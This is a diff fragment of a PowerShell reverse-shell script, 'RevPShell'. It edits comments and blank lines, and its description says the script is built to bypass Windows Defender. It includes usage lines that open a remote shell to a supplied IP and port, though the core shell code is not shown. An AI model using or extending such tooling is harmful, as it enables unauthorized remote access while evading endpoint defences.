@@ -5,7 +5,7 @@ function RevPShell
     PowerShell Reverse Shell
 
     .DESCRIPTION
-    This script is a light-weight version of the NishangProject PowerShellTcp script desiged to bypass Windows Defender
+    This script is a light-weight PowerShell Rev TCP Shell
     #>
 
     [CmdletBinding(DefaultParameterSetName="reverse")] Param(
@@ -16,7 +16,7 @@ function RevPShell
 { 
     <#
     .SYNOPSIS
-    PowerShell Reverse Shell
+    PowerShell Reverse TCP
 
     .DESCRIPTION
     This script is a light-weight version of the NishangProject PowerShellTcp script desiged to bypass Windows Defender
@@ -108,8 +108,6 @@ function RevPShell
  # i.e. RevPShell -Reverse 127.0.0.2 -Port 443
 }
 
-
-
         $IPAddress,
 
         [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
@@ -190,8 +188,3 @@ function RevPShell
  # RevPShell -Reverse -IPAddress <IP> -Port <port> 
  # i.e. RevPShell -Reverse 127.0.0.2 -Port 443
 }
-
-
-
-
-
